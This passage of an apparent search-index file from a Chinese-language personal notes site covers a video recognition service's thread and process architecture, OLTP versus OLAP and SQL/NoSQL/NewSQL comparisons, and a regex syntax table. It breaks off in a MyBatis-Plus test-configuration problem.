<p>\u540c\u65f6\u6211\u4eec\u5728\u5b9e\u8df5\u4e2d\u53d1\u73b0\uff0c\u8bc6\u522b\u4e1a\u52a1\u5c5e\u4e8e\u8ba1\u7b97\u5bc6\u96c6\u578b\u7684\u4e1a\u52a1\uff0c\u5728\u521d\u4ee3\u7684\u67b6\u6784\u6a21\u578b\u4e2d\uff0c\u4e00\u65e6\u8fdb\u5165\u8bc6\u522b\u4e1a\u52a1\uff0c\u6574\u4e2a\u4e1a\u52a1\u4fbf\u4f1a\u8fdb\u5165\u9677\u5165\u963b\u585e\uff0c\u5176\u4ed6\u4e1a\u52a1\uff08\u5982\u62cd\u6444\u4e1a\u52a1\uff0c\u4fdd\u5b58\u4e1a\u52a1\uff0c\u6570\u636e\u540c\u6b65\u4e1a\u52a1\uff09\u4fbf\u65e0\u6cd5\u8fdb\u884c\uff0c\u6700\u7ec8\u5bfc\u81f4\u4ea7\u54c1\u7684\u4f7f\u7528\u4f53\u9a8c\u5927\u5927\u4e0b\u964d\u3002</p> <p>\u4e3a\u6b64\u6211\u4eec\u91c7\u7528\u5e76\u884c-\u5e76\u53d1\u7ed3\u5408\u7684\u65b9\u5f0f\uff0c\u5c06I/O\u5bc6\u96c6\u578b\u7684\u4e1a\u52a1\uff0c\u5982\u62cd\u6444\u3001\u7ed3\u679c\u4fdd\u5b58\uff0c\u6570\u636e\u540c\u6b65\u4f7f\u7528\u591a\u7ebf\u7a0b\u8fd0\u884c\uff0c\u9632\u6b62\u7531\u4e8e\uff1b\u5bf9\u4e8e\u8ba1\u7b97\u5bc6\u96c6\u578b\u7684\u6211\u4eec\u91c7\u7528\u591a\u8fdb\u7a0b+\u6c60\u5316\u7684\u6280\u672f\u8fd0\u884c\uff0c\u6781\u5927\u7684\u5229\u7528\u7387CPU/GPU\u7b97\u529b\uff0c\u5c24\u5176\u662f\u5bf9\u4e8e\u591a\u6838CPU\uff0c\u6548\u7387\u63d0\u5347\u6548\u679c\u663e\u8457\uff1b\u7ebf\u7a0b\u3001\u8fdb\u7a0b\u4e4b\u95f4\u901a\u8fc7\u6d88\u606f\u961f\u5217\u8fdb\u884c\u901a\u4fe1\uff0c\u5b9e\u73b0\u4e86\u6a21\u5757\u4e4b\u95f4\u7684\u89e3\u8026\u3002</p> <pre><code>%%{ init: { 'flowchart': { 'curve': 'stepBefore' } } }%%\n\ngraph TB\n    subgraph Detection\n        D[(\u7279\u5f81\u5e27\u6c60)] ==&gt; D1[\u6a21\u578b\u8fdb\u7a0b1] ==&gt; R[(\u7ed3\u679c\u6c60)]\n        D ==&gt; D2[\u6a21\u578b\u8fdb\u7a0b2] ==&gt; R\n    end\n    subgraph IO\n        V((\u89c6\u9891/\u6444\u50cf\u5934)) --&gt; F&gt;\u7279\u5f81\u63d0\u53d6] -- \"\u7279\u5f81\u5e27\" --&gt; D\n        V -- \"\u4fdd\u5b58\u89c6\u9891\" --&gt; VW[/\u89c6\u9891\u4fdd\u5b58\\] -.KCP.-&gt; S[\\\u8fdc\u7a0b\u670d\u52a1\u5668\\]\n        R -- \"\u7ed3\u679c\u83b7\u53d6\" --&gt; RD[/\u7ed3\u679c\u4fdd\u5b58\\] -.KCP.-&gt; S[\\\u8fdc\u7a0b\u670d\u52a1\u5668\\]\n    end\n</code></pre>"},{"location":"Record%26Review/%E5%A4%A7%E6%95%B0%E6%8D%AE%E4%B8%8B%E7%9A%84%E6%95%B0%E6%8D%AE%E5%AD%98%E5%82%A8%E9%97%AE%E9%A2%98/","title":"\u5927\u6570\u636e\u4e0b\u7684\u6570\u636e\u5b58\u50a8\u95ee\u9898","text":""},{"location":"Record%26Review/%E5%A4%A7%E6%95%B0%E6%8D%AE%E4%B8%8B%E7%9A%84%E6%95%B0%E6%8D%AE%E5%AD%98%E5%82%A8%E9%97%AE%E9%A2%98/#olapoltp","title":"OLAP\u548cOLTP","text":""},{"location":"Record%26Review/%E5%A4%A7%E6%95%B0%E6%8D%AE%E4%B8%8B%E7%9A%84%E6%95%B0%E6%8D%AE%E5%AD%98%E5%82%A8%E9%97%AE%E9%A2%98/#_2","title":"\u6982\u5ff5","text":"<p>\u6570\u636e\u5e93\uff1a\u662fOLTP\uff08\u8054\u673a\u4e8b\u52a1\u5904\u7406\uff09\u5e94\u7528\u7684\u573a\u666f\uff0c\u5176\u5b58\u50a8\u7684\u4e3b\u8981\u662f\u4e0e\u4e1a\u52a1\u76f4\u63a5\u76f8\u5173\u7684\u6570\u636e\uff0c\u5f3a\u8c03\u51c6\u786e\u3001\u4f4e\u65f6\u5ef6\u3001\u9ad8\u5e76\u53d1\uff0c\u5982\u679c\u6ca1\u6709\u7279\u522b\u5f3a\u8c03\uff0c\u57fa\u672c\u4e0a\u6570\u636e\u5e93\u91cc\u53ea\u4f1a\u53bb\u5b58\u50a8\u4e0e\u4e1a\u52a1\u76f8\u5173\u7684\u6570\u636e\u3002</p> <p>\u6570\u636e\u4ed3\u5e93\uff1aOLAP\uff08\u8054\u673a\u5206\u6790\u5904\u7406\uff09\u662f\u6570\u636e\u4ed3\u5e93\u7cfb\u7edf\u7684\u4e3b\u8981\u5e94\u7528\uff0c\u5176\u652f\u6301\u7684\u5bf9\u8c61\u53ea\u8981\u662f\u9762\u5411\u5206\u6790\u573a\u666f\u7684\u5e94\u7528\uff0c\u63d0\u4f9b\u7ed3\u6784\u5316\u7684\u3001\u4e3b\u9898\u5316\u7684\u6570\u636e\u63d0\u4f9b\u7ed9\u8fd0\u8425\uff0c\u505a\u4e1a\u52a1\u53cd\u9988\u548c\u8f85\u52a9\u51b3\u7b56\u7528\uff0c\u540c\u65f6\uff0c\u6709\u4e9b\u573a\u666f\u4e0b\uff0c\u4e5f\u53ef\u4ee5\u7531\u6570\u636e\u4ed3\u5e93\u5bf9\u4e1a\u52a1\u8fdb\u884c\u652f\u6301\u3002</p> <ul> <li>OLTP\u4e5f\u5c31\u662f\u6211\u4eec\u4e00\u822c\u7528\u6765\u505a\u4e1a\u52a1\u6570\u636e\u5b58\u50a8\u7684\uff0c\u8bfb\u5199\u64cd\u4f5c\u90fd\u6709\uff0c\u4e00\u822c\u662f\u7531Applications\u5bf9\u5176\u8fdb\u884c\u64cd\u4f5c\uff0c\u7531\u7528\u6237\u8bfb\u5199\u6570\u636e\u3002\u4f8b\u5982\u5546\u57ce\u7684\u8ba2\u5355\u6570\u636e\u3001\u5e93\u5b58\u6570\u636e\u7b49\u3002</li> <li>OLAP\u4e00\u822c\u662f\u7528\u6765\u7ed9\u5185\u90e8\u4eba\u5458\u505a\u6570\u636e\u5206\u6790\u7684\uff0c\u4ed6\u66f4\u52a0\u4fa7\u91cd\u4e8e\u5bf9\u6570\u636e\u7684\u67e5\u627e\uff0c\u5206\u6790\u7b49\u3002\u4e00\u822c\u60c5\u51b5\u4e0b\u662f\u53ea\u63d0\u4f9b\u5185\u90e8\u4eba\u5458\u4f7f\u7528\u7684\uff0c\u4f8b\u5982\u5927\u516c\u53f8\u505a\u5e02\u573a\u7684\u8c03\u67e5\u7b49\u3002\u4e5f\u53ef\u4ee5\u7528\u6765\u505a\u641c\u7d22\u548c\u63a8\u8350\u529f\u80fd\u3002</li> </ul> \u5bf9\u6bd4\u7ef4\u5ea6 OLTP OLAP \u4e00\u53e5\u8bdd\u7279\u5f81 \u5c0f\u4e8b\u52a1\u4f17\u591a\u7684\u573a\u666f \u4f7f\u7528\u590d\u6742\u67e5\u8be2\u6765\u5904\u7406\u8f83\u5927\u6570\u636e\u91cf\u7684\u573a\u666f ACID \u5f3a \u5f31 \u9762\u5411\u7528\u6237 \u6570\u636e\u5e93\u64cd\u4f5c\u4eba\u5458 \u51b3\u7b56\u4eba\u5458\u3001\u9ad8\u7ea7\u7ba1\u7406\u4eba\u5458\uff0c\u6570\u636e\u5e93\u79d1\u5b66\u5bb6\u3001\u4e1a\u52a1\u5206\u6790\u5e08\u548c\u77e5\u8bc6\u5de5\u4f5c\u8005 \u4f7f\u7528\u573a\u666f \u91d1\u878d\uff08\u5982\u94f6\u884c\u3001\u80a1\u7968\uff09\u3001\u7535\u5546\u3001\u65c5\u884c\u9884\u8ba2\u7b49 \u5546\u4e1a\u667a\u80fd\uff08BI\uff09\u3001\u6570\u636e\u6316\u6398\u548c\u6c14\u538b\u51b3\u7b56\u652f\u6301\u5e94\u7528\u7a0b\u5e8f \u57fa\u672c\u64cd\u4f5c \u4e3b\u8981\u4e3a\uff1ainsert, update, delete\u4e3a\u4e3b \u4e3b\u8981\u4e3a\u805a\u5408\u64cd\u4f5c\uff0c\u7a97\u53e3\u64cd\u4f5c\u7b49\u4e3a\u4e3b \u64cd\u4f5c\u6570\u636e\u8303\u56f4 \u901a\u5e38\u8bfb\u5199\u6570\u636e\u91cf\u8f83\u5c0f\uff08\u6570\u5341\u6761\u8bb0\u5f55\uff09 \u901a\u5e38\u8bfb\u5199\u6570\u636e\u91cf\u5927\uff08\u6570\u767e\u4e07\u6761\u8bb0\u5f55\uff09 \u4e3b\u8981\u8861\u91cf\u6307\u6807 \u4e8b\u52a1\u541e\u5410\u91cf\uff08TPS\uff09 \u67e5\u8be2\u54cd\u5e94\u901f\u5ea6\uff08QPS\uff09 \u54cd\u5e94\u65f6\u95f4\u8981\u6c42 \u5b9e\u65f6\u6027\u8981\u6c42\u9ad8\uff0c\u901a\u5e38\u6beb\u79d2\u7ea7 \u5b9e\u65f6\u6027\u8981\u6c42\u4f4e\uff0c\u4f9d\u8d56\u4e8e\u6240\u5904\u7406\u7684\u6570\u636e\u91cf\uff0c\u65f6\u95f4\u8303\u56f4\u7531\u5c0f\u65f6\uff0c\u5206\u949f\u79d2\u7ea7\uff0c\u4e9a\u79d2\u7ea7\u7b49 \u6570\u636e\u6e90 \u4e1a\u52a1\u7cfb\u7edf\u5b9e\u65f6\u4e8b\u52a1\u6570\u636e \u4e1a\u52a1\u7cfb\u7edf\u4e2d\u7684\u5386\u53f2\u6570\u636e\uff0c\u4e8b\u52a1\u578b\u6570\u636e \u6570\u636e\u5e93\u8868\u8bbe\u8ba1\u89c4\u8303 \u901a\u5e38\u9700\u8981\u6ee1\u8db3\u4e09\u8303\u5f0f\uff083NF\uff09 \u4e0d\u4f5c\u89c4\u8303 \u6570\u636e\u91cf/\u78c1\u76d8\u7a7a\u95f4 \u8f83\u5c0f\uff0cMB~TB\u7ea7 \u8f83\u5927\uff0cGB~PB\u7ea7 \u5e76\u53d1\u91cf \u9700\u8981\u652f\u6301\u5927\u5e76\u53d1\u73af\u5883 \u5bf9\u5e76\u53d1\u91cf\u8981\u6c42\u4e0d\u9ad8 \u7a33\u5b9a\u6027 \u8981\u6c42\u9ad8 \u8981\u6c42\u9ad8 \u53ef\u7528\u6027\uff08\u5907\u4efd\uff0c\u6062\u590d\uff09 \u5b8c\u6574\u7684\u5907\u4efd\uff0c\u6062\u590d\u80fd\u529b\uff08\u5168\u91cf\uff0c\u589e\u91cf\uff09 \u4e3b\u8981\u6309\u65f6\u95f4\u70b9\u8fdb\u884c\u5907\u4efd/\u6062\u590d\uff0c\u5907\u4efd/\u6062\u590d\u8981\u6c42\u4e0d\u9ad8 \u6570\u636e\u5b8c\u6574\u6027\u8981\u6c42 \u5f3a\u4e00\u81f4\u6027\u8981\u6c42 \u6570\u636e\u5b8c\u6574\u6027\u8981\u6c42\u4e0d\u9ad8 \u7cfb\u7edf\u541e\u5410\u91cf\uff0cIOPS \u4f4e \u9ad8 \u6311\u6218 1.\u9ad8\u541e\u5410\u91cf\uff0c\u4fdd\u8bc1\u6570\u636e\u5b8c\u6574\u6027\uff0c\u53ef\u9760\u6027\u7b49\uff1b2.\u5b8c\u6574\u7684\u751f\u6001\u5de5\u5177\uff0c\u4e0d\u540c\u5f02\u6784\u4ea7\u54c1\u95f4\u534f\u8c03\u4f7f\u7528\u96be\u5ea6\uff1b 1.\u6d77\u91cf\u6570\u636e\u9ad8\u6548\uff0c\u4f4e\u6210\u672c\u7684\u6570\u636e\u5b58\u50a8\uff1b2.\u590d\u6742\u67e5\u8be2\u9ad8\u6548\u5904\u7406\uff1b \u53ef\u9760\u6027\u8981\u6c42 \u901a\u5e38\u8981\u6c42\u9ad8\u53ef\u9760\u6027\uff1a\u4e3b\u5907\u3001\u540c\u57ce\u707e\u5907\u3001\u5f02\u5730\u707e\u5907 \u53ef\u9760\u6027\u8981\u6c42\u76f8\u5bf9\u4f4e\uff0c\u4e00\u822c\u540c\u57ce\u707e\u5907 \u8bfb\u7279\u6027 \u7b80\u5355\u67e5\u8be2\u4e3a\u4e3b\u3001\u6bcf\u6b21\u67e5\u8be2\u53ea\u8fd4\u56de\u5c11\u91cf\u6570\u636e \u590d\u6742\u67e5\u8be2\u4e3a\u4e3b\u3001\u5bf9\u5927\u91cf\u6570\u636e\u8fdb\u884c\u6c47\u603b \u5199\u7279\u6027 1.\u968f\u673a\u3001\u4f4e\u5ef6\u8fdf\u3001\u5c0f\u6570\u636e\u91cf\uff1b2.\u6570\u636e\u66f4\u65b0\u3001\u5220\u9664\u9891\u7e41 1.\u5f88\u5c11\u6709\u66f4\u65b0\u3001\u5220\u9664\u64cd\u4f5c\uff1b2.\u5927\u6570\u636e\u91cf\u6279\u91cf\u3001\u5e76\u884c\u5bfc\u5165 \u6570\u636e\u6a21\u578b ER\uff08\u5b9e\u4f53\u3001\u5173\u7cfb\uff09 \u661f\u578b\u6216\u8005\u96ea\u82b1\u3001\u661f\u5ea7 \u6570\u636e\u7c92\u5ea6 \u884c\u7ea7 record \u591a\u8868 \u6570\u636e\u7ed3\u6784 \u9ad8\u5ea6\u7ed3\u6784\u5316\u3001\u590d\u6742\uff0c\u9002\u5408\u64cd\u4f5c\u8ba1\u7b97 \u7b80\u5355\u3001\u9002\u5408\u5206\u6790 \u6570\u636e\u5b57\u6bb5 \u52a8\u6001\u53d8\u5316\uff0c\u6309\u5b57\u6bb5\u66f4\u65b0 \u9759\u6001\u3001\u5f88\u5c11\u76f4\u63a5\u66f4\u65b0\uff0c\u5b9a\u65f6\u6dfb\u52a0\u3001\u5237\u65b0 \u6570\u636e\u8fd4\u56de\u503c \u4e00\u822c\u4e3a\u8bb0\u5f55\u672c\u8eab\u6216\u8be5\u8bb0\u5f55\u7684\u591a\u4e2a\u5217 \u4e00\u822c\u4e3a\u805a\u5408\u8ba1\u7b97\u7ed3\u679c"},{"location":"Record%26Review/%E5%A4%A7%E6%95%B0%E6%8D%AE%E4%B8%8B%E7%9A%84%E6%95%B0%E6%8D%AE%E5%AD%98%E5%82%A8%E9%97%AE%E9%A2%98/#_3","title":"\u5b9e\u4f8b","text":""},{"location":"Record%26Review/%E5%A4%A7%E6%95%B0%E6%8D%AE%E4%B8%8B%E7%9A%84%E6%95%B0%E6%8D%AE%E5%AD%98%E5%82%A8%E9%97%AE%E9%A2%98/#oltp","title":"OLTP","text":"<p>OLTP\u7684\u5b9e\u4f8b\u6709\u5f88\u591a\uff0c\u800c\u4e14\u5e38\u89c1\u3002\u5927\u81f4\u5206\u7c7b\u5c31\u53ef\u4ee5RDBMS\uff08\u5173\u7cfb\u578b\u6570\u636e\u5e93\uff09\uff0cNewSQL\uff0cNoSQL\u3002</p> <ul> <li>RDBMS\uff1a\u5173\u7cfb\u578b\u6570\u636e\u5e93\u6709\u5f88\u957f\u7684\u53d1\u5c55\u5386\u53f2\uff0c\u6240\u4ee5\u6280\u672f\u548c\u79cd\u7c7b\u4e5f\u6bd4\u8f83\u6210\u719f\uff0c\u5e38\u89c1\u7684\u4f8b\u5982MySQL\u3001ORACLE\u7b49\u7b49\u3002RDBMS\u4e3b\u8981\u4fa7\u91cd\u4e8e\u5bf9ACID\u7684\u6ee1\u8db3\u3002</li> </ul> <p>ACID\u7684\u89e3\u91ca\uff08from \u767e\u5ea6\u767e\u79d1\uff09</p> <ul> <li>Atomicity\uff08\u539f\u5b50\u6027\uff09\uff1a\u4e00\u4e2a\u4e8b\u52a1\uff08transaction\uff09\u4e2d\u7684\u6240\u6709\u64cd\u4f5c\uff0c\u8981\u4e48\u5168\u90e8\u5b8c\u6210\uff0c\u8981\u4e48\u5168\u90e8\u4e0d\u5b8c\u6210\uff0c\u4e0d\u4f1a\u7ed3\u675f\u5728\u4e2d\u95f4\u67d0\u4e2a\u73af\u8282\u3002\u4e8b\u52a1\u5728\u6267\u884c\u8fc7\u7a0b\u4e2d\u53d1\u751f\u9519\u8bef\uff0c\u4f1a\u88ab\u6062\u590d\uff08Rollback\uff09\u5230\u4e8b\u52a1\u5f00\u59cb\u524d\u7684\u72b6\u6001\uff0c\u5c31\u50cf\u8fd9\u4e2a\u4e8b\u52a1\u4ece\u6765\u6ca1\u6709\u6267\u884c\u8fc7\u4e00\u6837\u3002</li> <li>Consistency\uff08\u4e00\u81f4\u6027\uff09\uff1a\u5728\u4e8b\u52a1\u5f00\u59cb\u4e4b\u524d\u548c\u4e8b\u52a1\u7ed3\u675f\u4ee5\u540e\uff0c\u6570\u636e\u5e93\u7684\u5b8c\u6574\u6027\u6ca1\u6709\u88ab\u7834\u574f\u3002\u8fd9\u8868\u793a\u5199\u5165\u7684\u8d44\u6599\u5fc5\u987b\u5b8c\u5168\u7b26\u5408\u6240\u6709\u7684\u9884\u8bbe\u89c4\u5219\uff0c\u8fd9\u5305\u542b\u8d44\u6599\u7684\u7cbe\u786e\u5ea6\u3001\u4e32\u8054\u6027\u4ee5\u53ca\u540e\u7eed\u6570\u636e\u5e93\u53ef\u4ee5\u81ea\u53d1\u6027\u5730\u5b8c\u6210\u9884\u5b9a\u7684\u5de5\u4f5c\u3002</li> <li>Isolation\uff08\u9694\u79bb\u6027\uff09\uff1a\u6570\u636e\u5e93\u5141\u8bb8\u591a\u4e2a\u5e76\u53d1\u4e8b\u52a1\u540c\u65f6\u5bf9\u5176\u6570\u636e\u8fdb\u884c\u8bfb\u5199\u548c\u4fee\u6539\u7684\u80fd\u529b\uff0c\u9694\u79bb\u6027\u53ef\u4ee5\u9632\u6b62\u591a\u4e2a\u4e8b\u52a1\u5e76\u53d1\u6267\u884c\u65f6\u7531\u4e8e\u4ea4\u53c9\u6267\u884c\u800c\u5bfc\u81f4\u6570\u636e\u7684\u4e0d\u4e00\u81f4\u3002\u4e8b\u52a1\u9694\u79bb\u5206\u4e3a\u4e0d\u540c\u7ea7\u522b\uff0c\u5305\u62ec\u8bfb\u672a\u63d0\u4ea4\uff08Read uncommitted\uff09\u3001\u8bfb\u63d0\u4ea4\uff08read committed\uff09\u3001\u53ef\u91cd\u590d\u8bfb\uff08repeatable read\uff09\u548c\u4e32\u884c\u5316\uff08Serializable\uff09\u3002</li> <li>Durability\uff08\u6301\u4e45\u6027\uff09\uff1a\u4e8b\u52a1\u5904\u7406\u7ed3\u675f\u540e\uff0c\u5bf9\u6570\u636e\u7684\u4fee\u6539\u5c31\u662f\u6c38\u4e45\u7684\uff0c\u5373\u4fbf\u7cfb\u7edf\u6545\u969c\u4e5f\u4e0d\u4f1a\u4e22\u5931\u3002</li> </ul> <ul> <li> <p>NoSQL\uff1a\u975e\u5173\u7cfb\u578b\u6570\u636e\u5e93\u4e5f\u5341\u5206\u5e38\u89c1\uff0c\u4ed6\u7684\u4fa7\u91cd\u70b9\u4e3b\u8981\u5728\u4e8e\u9ad8\u53ef\u7528\u6027\u548c\u9ad8\u6269\u5c55\u6027\u3002\u5e38\u89c1\u7684\u4f8b\u5982Redis\u3001MongoDB\u3002</p> </li> <li> <p>NewSQL\uff1a\u5728\u5927\u6570\u636e\u4e0b\u7684\u4e00\u79cd\u65b0\u7684\u6570\u636e\u5e93\uff0c\u4ed6\u7ed3\u5408\u4e86NoSQL\u548cRDBMS\u7684\u7279\u70b9\u3002</p> </li> </ul> \u7279\u70b9 SQL NoSQL NewSQL \u5173\u7cfb\u578b\u5c5e\u6027 \u662f\u7684\uff0c\u5b83\u5728\u5f88\u5927\u7a0b\u5ea6\u4e0a\u9075\u5faa\u5173\u7cfb\u6a21\u578b\u3002 \u4e0d\uff0c\u5b83\u4e0d\u9075\u5faa\u5173\u7cfb\u6a21\u578b\u3002\u5b83\u88ab\u8bbe\u8ba1\u6210\u4e0e\u4e4b\u5b8c\u5168\u4e0d\u540c\u3002 \u662f\u7684\uff0c\u56e0\u4e3a\u5173\u7cfb\u6a21\u578b\u5bf9\u4e8e\u5b9e\u65f6\u5206\u6790\u6765\u8bf4\u540c\u6837\u81f3\u5173\u91cd\u8981\u3002 ACID \u662f\u7684\uff0cACID\u5c5e\u6027\u662f\u5176\u5e94\u7528\u7684\u57fa\u7840 \u4e0d\u662f\uff0c\u800c\u662f\u63d0\u4f9bCAP\u652f\u6301 \u662f\u7684\uff0cACID\u7684\u5c5e\u6027\u88ab\u7167\u987e\u5230\u4e86 SQL \u5bf9SQL\u7684\u652f\u6301 \u4e0d\u652f\u6301\u65e7\u7684SQL \u662f\u7684\uff0c\u5bf9\u65e7SQL\u6709\u9002\u5f53\u7684\u652f\u6301\uff0c\u751a\u81f3\u589e\u5f3a\u4e86\u529f\u80fd\u3002 OLTP \u5bf9OLTP\u6570\u636e\u5e93\u6765\u8bf4\u6548\u7387\u4e0d\u9ad8\u3002 \u5b83\u652f\u6301\u6b64\u7c7b\u6570\u636e\u5e93\uff0c\u4f46\u4e0d\u662f\u6700\u9002\u5408\u7684\u3002 \u5b8c\u5168\u652f\u6301OLTP\u6570\u636e\u5e93\u7684\u529f\u80fd\uff0c\u6548\u7387\u5f88\u9ad8 \u6269\u5c55\u6027 \u5782\u76f4\u6269\u5c55 \u53ea\u6709\u5782\u76f4\u6269\u5c55 \u5782\u76f4+\u6c34\u5e73\u6269\u5c55 \u67e5\u8be2\u5904\u7406 \u53ef\u4ee5\u8f7b\u677e\u5730\u5904\u7406\u7b80\u5355\u7684\u67e5\u8be2\uff0c\u5f53\u67e5\u8be2\u7684\u6027\u8d28\u53d8\u5f97\u590d\u6742\u65f6\u5c31\u4f1a\u5931\u8d25 \u5728\u5904\u7406\u590d\u6742\u7684\u67e5\u8be2\u65f6\u6bd4SQL\u66f4\u597d \u5728\u5904\u7406\u590d\u6742\u67e5\u8be2\u548c\u5c0f\u578b\u67e5\u8be2\u65f6\u6548\u7387\u5f88\u9ad8\u3002 \u5206\u5e03\u5f0f\u6570\u636e\u5e93 \u4e0d\u652f\u6301 \u652f\u6301 \u652f\u6301"},{"location":"Record%26Review/%E5%A4%A7%E6%95%B0%E6%8D%AE%E4%B8%8B%E7%9A%84%E6%95%B0%E6%8D%AE%E5%AD%98%E5%82%A8%E9%97%AE%E9%A2%98/#olap","title":"OLAP","text":"<p>\u53ef\u53c2\u8003OLAP | \u57fa\u7840\u77e5\u8bc6\u68b3\u7406 </p> <p>OLAP\u7684\u5206\u4e3a\u4e24\u4e2a\u5927\u4f53\u7684\u65b9\u5411\uff1a\u4f20\u7edf\u7684OLAP\u548c\u5927\u6570\u636eOLAP</p> <ul> <li>\u4f20\u7edfOLAP\uff1a\u5341\u5206\u5e38\u89c1\uff0c\u4f8b\u5982\u6211\u4eec\u65e5\u5e38\u4f7f\u7528\u7684Excel\uff0c\u8fd8\u6709Expression</li> <li>\u5927\u6570\u636eOLAP\uff1a\u5c5e\u4e8e\u662f\u5e55\u540e\u5de5\u4f5c\u8005\uff0c\u867d\u7136\u4e0d\u5e38\u89c1\uff0c\u4f46\u662f\u6211\u4eec\u65e5\u5e38\u90fd\u5728\u4f7f\u7528\u3002\u4f8b\u5982\u6211\u4eec\u65e5\u5e38\u4f7f\u7528\u7684\u641c\u7d22\u5f15\u64ce\uff0c\u5c31\u662f\u57fa\u4e8eOLAP\u7684Elasticsearch\uff08\u7b80\u79f0ES\uff09\u5b9e\u73b0\u7684\u3002</li> </ul> <p>\u8bef\u533a</p> <p>OLAP\u548cOLTP\u53ea\u662f\u4e24\u4e2a\u5bf9\u4e8e\u6570\u636e\u5904\u7406\u7684\u6982\u5ff5\uff0c\u5728\u6570\u636e\u5e93\u9009\u578b\u7684\u65f6\u5019\u53ea\u6709\u9002\u5408\u800c\u8a00\uff0c\u4f46\u662f\u5e76\u4e0d\u662f\u7ed1\u5b9a\u7684\u5173\u7cfb\uff0c\u6bd4\u5982MySQL\u4e5f\u53ef\u4ee5\u505aOLAP\u7684\u5c0f\u578b\u6570\u636e\u5904\u7406\u3002\u8fd9\u5c31\u597d\u50cfJAVA\u4e0d\u4ec5\u4ec5\u80fd\u505aWEB\u5f00\u53d1\uff0c\u4e5f\u53ef\u4ee5\u505a\u5d4c\u5165\u5f0f\u7b49\uff0c\u77e5\u8bc6\u66f4\u9002\u5408\u800c\u5df2\u3002</p>"},{"location":"Record%26Review/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/","title":"\u6b63\u5219\u8868\u8fbe\u5f0f","text":"\u8868\u793a \u542b\u4e49 . \u5355\u4e2a\u5b57\u7b26\uff0c\u6ca1\u6709\u9650\u5236\u6761\u4ef6\uff0c\u4f46\u662f\u4e00\u822c\u4e0d\u5305\u62ec\u6362\u884c\u7b26 [] \u5355\u4e2a\u5b57\u7b26\uff0c\u4f46\u662f\u53ef\u4ee5\u5728<code>[]</code>\u4e2d\u9650\u5236\u8303\u56f4\uff0c\u6bd4\u5982<code>[abcd]</code>\u8868\u793a\u5355\u4e2a\u5b57\u7b26\u53ea\u80fd\u662fabcd\u5176\u4e2d\u7684\u4e00\u4e2a\uff0c<code>[a-z]</code>\u8868\u793a\u6240\u6709\u5c0f\u5199\u5b57\u6bcd\uff0c<code>[1-4]</code>\u8868\u793a1\u52304\u7684\u6570\u5b57 [^] \u8fd9\u4e2a\u548c\u4e0a\u9762\u7684\u76f8\u53cd\uff0c<code>^</code>\u5728\u4e8c\u8fdb\u5236\u4e2d\u4e0d\u5c31\u662f\u53d6\u6cd5\u7684\u610f\u601d\u5417\uff1f<code>[^a-c]</code>\u8868\u793a\u4e0d\u4e3aa\u3001b\u3001c\u7684\u5355\u4e2a\u5b57\u7b26 * \u8868\u793a\u5b57\u7b26\u51fa\u73b0n\u6b21\uff0cn\u53ef\u4ee5\u4e3a\u4efb\u610f\u975e\u8d1f\u6574\u6570\uff0c\u6bd4\u5982<code>abc*</code>\u53ef\u4ee5\u5339\u914d\u5230<code>ab</code>\u3001<code>abc</code>\u3001<code>abccc</code>\u7b49 + \u8868\u793a\u5b57\u7b26\u51fa\u73b01\u6b21\u4ee5\u4e0a\uff0c\u6bd4\u5982<code>abc+</code>\u53ef\u4ee5\u5339\u914d\u5230<code>abc</code>\u3001<code>abccc</code>\u7b49 ? \u8868\u793a\u5b57\u7b26\u6700\u591a\u51fa\u73b0\u4e00\u6b21\uff0c\u6bd4\u5982<code>abc?</code>\u53ef\u4ee5\u5339\u914d\u5230<code>abc</code>\u548c<code>ab</code>\u8fd9\u4e24\u4e2a | \u8868\u793a\u5de6\u53f3\u4efb\u610f\u4e00\u4e2a\uff0c\u8fd0\u7b97\u7b49\u7ea7\u6700\u4f4e\uff0c\u6bd4\u5982<code>abc|def</code>\u8868\u793a\u53ef\u4ee5\u4e3a<code>abc</code>\u6216\u8005<code>def</code> {m} \u8868\u793a\u5355\u4e2a\u5b57\u7b26\u51fa\u73b0m\u6b21\uff0c\u6bd4\u5982<code>abc{3}</code>\u5c31\u7b49\u4ef7\u4e0e<code>abccc</code> {m,n} \u8868\u793a\u5355\u4e2a\u5b57\u7b26\u51fa\u73b0m\u5230n\u6b21,\u6bd4\u5982<code>abc{2,4}</code>\u8868\u793a<code>abcc</code>\u3001<code>abccc</code>\u3001<code>abcccc</code> ^ \u5339\u914d\u5b57\u7b26\u4e32\u5f00\u5934\uff0c\u6bd4\u5982<code>^abc</code>\u8868\u793a\u5339\u914d\u5230\u5f00\u5934\u4e3aabc\u7684\u5b57\u7b26\u4e32 $ \u5339\u914d\u5b57\u7b26\u4e32\u7ed3\u5c3e\uff0c\u540c\u4e0a () \u5206\u7ec4\u6807\u8bb0\uff0c\u548c\u8ba1\u7b97\u662f\u7684<code>()</code>\u4e00\u6837 \\d \u5339\u914d\u6570\u5b57\uff0c\u7b49\u4ef7<code>[0-9]</code> \\w \u5339\u914d\u5b57\u7b26\uff0c\u7b49\u4ef7<code>[a-zA-Z0-9_]</code>\u6ce8\u610f\u8fd9\u91cc\u8fd8\u6709\u4e0b\u5212\u7ebf"},{"location":"Record%26Review/%E7%8C%AB%E5%92%AA%E5%B0%8F%E7%A8%8B%E5%BA%8F/","title":"\u732b\u54aa\u5c0f\u7a0b\u5e8f","text":"<p>\u8bb0\u5f55\u732b\u54aa\u5c0f\u7a0b\u5e8f\u5728\u5f00\u53d1\u8fc7\u7a0b\u4e2d\u9047\u5230\u7684\u95ee\u9898\u548c\u89e3\u51b3\u601d\u8def\u3002\u4f9b\u4ee5\u540e\u5b66\u4e60</p>"},{"location":"Record%26Review/%E7%8C%AB%E5%92%AA%E5%B0%8F%E7%A8%8B%E5%BA%8F/#_2","title":"\u6d4b\u8bd5\u7c7b\u7684\u7279\u6b8a\u914d\u7f6e","text":""},{"location":"Record%26Review/%E7%8C%AB%E5%92%AA%E5%B0%8F%E7%A8%8B%E5%BA%8F/#_3","title":"\u95ee\u9898\u63cf\u8ff0","text":"<p>\u4f7f\u7528MyBatis-Plus\u65f6\u6d4b\u8bd5\u65f6\uff0c\u6d4b\u8bd5\u4e2d\u62a5\u9519\u627e\u4e0d\u5230\u8fde\u63a5<code>java.lang.IllegalStateException: Failed to load ApplicationContext</code>\uff0c\u4f46\u662f\u4e0d\u9002\u7528\u6d4b\u8bd5\u7c7b\u5374\u80fd\u591f\u6b63\u5e38\u8fd0\u884c\uff0c\u5f53\u65f6\u7684\u4ee3\u7801\u5982\u4e0b</p> <pre><code>@MybatisPlusTest\nclass CatMapperTest {\n    @Autowired\n    private CatMapper 